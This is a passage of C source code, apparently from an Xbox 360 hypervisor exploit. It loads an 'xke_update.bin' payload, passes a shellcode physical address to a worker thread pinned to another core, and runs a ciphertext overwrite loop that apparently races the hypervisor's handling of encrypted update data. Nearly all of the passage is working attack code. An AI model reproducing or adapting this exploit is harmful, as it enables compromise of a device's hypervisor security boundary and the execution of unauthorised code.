        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_XKE_OOM_2);
        return;
    }

    memset(pPayload, 0, PayloadDataSize);
    memset(pPayloadClean, 0, PayloadDataSize);

    // Read the payload file.
    if (ReadFile(PAYLOAD_DRIVE "\\xke_update.bin", pPayloadClean, 0, PayloadDataSize) == false)
    {
        DbgPrint("Failed to read XKE payload file\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_READING_XKE_PAYLOAD_FILE);
        return;
    }

    // Setup thread args.
    ThreadArgs.UpdateDataPhys = MmGetPhysicalAddress(pUpdateData);
    ThreadArgs.UpdateDataSize = pUpdateInfo->TotalSize;
    ThreadArgs.pPayloadClean = pPayloadClean;
    ThreadArgs.pPayloadBuffer = pPayload;
    ThreadArgs.PayloadPhys = MmGetPhysicalAddress(pPayload);
    ThreadArgs.PayloadSize = PayloadDataSize;
    ThreadArgs.pCompressedDataClean = pCleanUpdateData;
    ThreadArgs.CompressedDataSize = CleanUpdateDataSize;
    ThreadArgs.pCompressedDataInBuffer = pUpdateData + pUpdateInfo->UpdateDataOffset;
    ThreadArgs.pScratchDataInBuffer = pUpdateData + pUpdateInfo->ScratchBufferOffset;
    ThreadArgs.ScratchDataOffset = pUpdateInfo->ScratchBufferOffset;
    ThreadArgs.ScratchDataSize = pUpdateInfo->ScratchBufferSize;

    ThreadArgs.HvCheckAddress = pCipherTextBuffer->dec_output_buffer;
    ThreadArgs.ShellCodePhysAddress = ShellCodePhys;

    // Save the scratch pointer, we can't access pUpdateInfo from here on out because it'll be moved to protected memory by the hv.
    BYTE* pScratchPtr = pUpdateData + pUpdateInfo->ScratchBufferOffset;

    ThreadArgs.pScratchBuffer = pScratchPtr;

    // Create the worker threads.
    HANDLE hXKEWorkerThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunUpdatePayloadThreadProc, &ThreadArgs, CREATE_SUSPENDED, NULL);
    if (hXKEWorkerThread == NULL)
    {
        DbgPrint("Failed to create worker thread\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_CREATING_WORKER_THREAD);
        return;
    }

    // Move the XKE worker to the last physical core.
    DWORD dfsddf = XSetThreadProcessor(hXKEWorkerThread, 1);
    ResumeThread(hXKEWorkerThread);

    // Run ciphertext overwrite loop on HW thread 0.
    CiphertextOverwriteLoop(pScratchPtr, pCipherTextBuffer);

    // Should never make it here.
    DbgBreakPoint();
}
